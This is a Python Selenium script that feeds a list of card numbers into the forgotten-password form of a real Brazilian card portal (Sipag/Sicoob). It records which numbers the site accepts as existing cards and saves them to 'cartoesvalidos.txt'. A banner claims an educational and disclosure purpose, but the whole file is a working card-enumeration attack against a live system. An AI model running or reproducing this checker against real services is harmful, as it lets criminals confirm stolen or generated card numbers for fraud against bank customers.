from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException, NoSuchElementException, StaleElementReferenceException
import time
from art import text2art

def check_refazer_button(driver):
    try:
        WebDriverWait(driver, 10).until(
            EC.visibility_of_element_located((By.XPATH, "//a[@title='Limpar os campos']"))
        )
        return True
    except (NoSuchElementException, StaleElementReferenceException, TimeoutException):
        return False

def wait_for_navigation_to_complete(driver, xpath, timeout=30):
    try:
        WebDriverWait(driver, timeout).until(
            EC.visibility_of_element_located((By.XPATH, xpath))
        )
        return True
    except TimeoutException:
        return False

def read_card_numbers_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines() if line.strip()]

def fill_card_form(driver, card_number):
    campo1 = driver.find_element(By.ID, "frm2:cartaop1")
    campo2 = driver.find_element(By.ID, "frm2:cartaop2")
    campo3 = driver.find_element(By.ID, "frm2:cartaop3")
    campo4 = driver.find_element(By.ID, "frm2:cartaop4")

    campo1.send_keys(card_number[:4])
    campo2.send_keys(card_number[4:8])
    campo3.send_keys(card_number[8:12])
    campo4.send_keys(card_number[12:])

def criar_arquivo_saida():
    with open('cartoesvalidos.txt', 'w') as file:
        file.write('')  

chrome_options = Options()
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--headless")

card_numbers = read_card_numbers_from_file('lista.txt')

logo = text2art("Desenvolvido Por DIDIDEV")
print("Linkedin: https://www.linkedin.com/in/dididev")
print("Desenvolvido para Fins Educacionais, e para que o Sicoob Veja esse Problema que Envolve Dados Reais de Cartoes de Credito do Banco, que pode Favorecer Criminosos Digitais.")
print(logo)
time.sleep(5)

tipo_cartao = input("Escolha o tipo de cartão (1 - Cartão Pessoal, 2 - Cartão Empresarial): ")

if tipo_cartao not in ["1", "2"]:
    print("Tipo de cartão inválido! Digite '1' ou '2'.")
    exit()

criar_arquivo_saida()

with open('cartoesvalidos.txt', 'a') as file:
    for card_number in card_numbers:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)

        try:
            url_inicial = "https://web.sipag.com.br/sipagportador/wrk/portador/login.jsf"
            driver.get(url_inicial)

            WebDriverWait(driver, 20).until(
                EC.visibility_of_element_located((By.ID, "frm1:senhaEsquecida"))
            )

            senha_link = driver.find_element(By.ID, "frm1:senhaEsquecida")
            senha_link.click()

            WebDriverWait(driver, 20).until(
                EC.visibility_of_element_located((By.ID, "frm2:tipoCartao"))
            )

            select_tipo_cartao = Select(driver.find_element(By.ID, "frm2:tipoCartao"))
            select_tipo_cartao.select_by_value(tipo_cartao)

            WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.XPATH, "//a[@title='Após selecionar o tipo de cartão, continue a operação']"))
            )

            continuar_link = driver.find_element(By.XPATH, "//a[@title='Após selecionar o tipo de cartão, continue a operação']")
            continuar_link.click()

            fill_card_form(driver, card_number)

            WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.ID, "frm2:btContinuar"))
            )

            continuar_button = driver.find_element(By.ID, "frm2:btContinuar")
            continuar_button.click()

            if check_refazer_button(driver):
                result = f"Cartão Valido! {card_number}"
                file.write(result + "\n")
                print(result)
            else:
                result = f"Cartão Inexistente! {card_number}"
                print(result)

            time.sleep(1)

        finally:
            driver.quit()
